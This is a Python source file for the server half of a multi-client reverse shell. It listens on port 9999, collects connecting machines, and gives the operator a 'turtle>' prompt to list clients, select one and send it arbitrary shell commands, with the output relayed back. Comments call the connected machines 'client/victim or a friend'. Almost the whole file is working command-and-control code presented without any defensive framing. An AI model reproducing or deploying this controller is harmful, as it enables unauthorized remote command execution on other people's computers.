import sys
import time
import socket
import threading

from queue import Queue

NUMBER_OF_THREADS = 2
JOB_NUMBERS = [1, 2]
queue = Queue()
all_connections = []
all_address = []


# Create a Socket ( connect two computers)
def create_socket():
    try:
        global host
        global port
        global s
        host = ""
        port = 9999
        s = socket.socket()

    except socket.error as msg:
        print("Socket creation error: " + str(msg))


# Binding the socket and listening for connections
def bind_socket():
    try:
        global host
        global port
        global s
        print("Binding the Port: " + str(port))

        s.bind((host, port))
        s.listen(5)

    except socket.error as msg:
        print("Socket Binding error" + str(msg) + "\n" + "Retrying...")
        bind_socket()


# Handling connections from multiple clients and store to a list.
# closing previous connection when the server.py file restarted.
# Establish connection with a client (socket must be listening)

def accepting_connections():
    for c in all_connections:
        c.close()

    del all_connections[:]
    del all_address[:]

    while True:
        try:
            conn, address = s.accept()
            s.setblocking(1)      # Prevent Timeout

            all_connections.append(conn)
            all_address.append(address)

            print("Connection has been establish : " + str(address[0]))
        except:
            print("Error accepting Connections")

# Display all current active clients :

def list_connections():
    results = ''

    for i, conn in enumerate(all_connections):
        try:
            conn.send(str.encode(' '))
            conn.recv(20480)
        except:
            del all_connections[i]
            del all_address[i]
            continue

        results = str(i) + "   " + str(all_address[i][0]) + "   " + str(all_address[i][1]) + "\n"

    print("<----Clients---->" + "\n" + results)


# Selecting the target
def get_target(cmd):
    try:
        target = cmd.replace("select ", "")   # it is basically a id
        target = int(target)
        conn = all_connections[target]
        print("You are now Connected " + " IP : " + str(all_address[target][0]))
        print(str(all_address[target][0]) + ">", end="")
        return conn
    except Exception as e:
        print("Selection is not valid ")
        return None


# Send commands to client/victim or a friend
def send_target_commands(conn):
    while True:
        try:
            cmd = input()
            if cmd == 'quit':
                break
            if len(str.encode(cmd)) > 0:
                conn.send(str.encode(cmd))
                client_response = str(conn.recv(20480), "utf-8")
                print(client_response, end="")
        except:
            print("Error sending commands")
            break


# 2nd thread functions - 1) See all the clients 2) Select a client 3) Send commands to the connected client
# Interactive prompt for sending commands
# turtle> list
# 0 Friend-A Port
# 1 Friend-B Port
# 2 Friend-C Port
# turtle> select 1
# 192.168.0.112> dir
def start_turtle():

    while True:
        cmd = input("turtle>")
        if cmd == "list":
            list_connections()

        elif "select" in cmd:
            conn = get_target(cmd)
            if conn is not None:
                send_target_commands(conn)
        else:
            print("Command not Proper")
            break
def create_jobs():
    for x in JOB_NUMBERS:
        queue.put(x)
    queue.join()


# Do next job that is in the queue (handle connections, send commands)
def work():
    while True:
        x = queue.get()
        if x == 1:
            create_socket()
            bind_socket()
            accepting_connections()
        elif x == 2:
            start_turtle()

        queue.task_done()





def create_thread():
    for _ in range(NUMBER_OF_THREADS):
        t = threading.Thread(target=work)
        t.daemon = True
        t.start()





if __name__ == "__main__":
    create_thread()
    create_jobs()


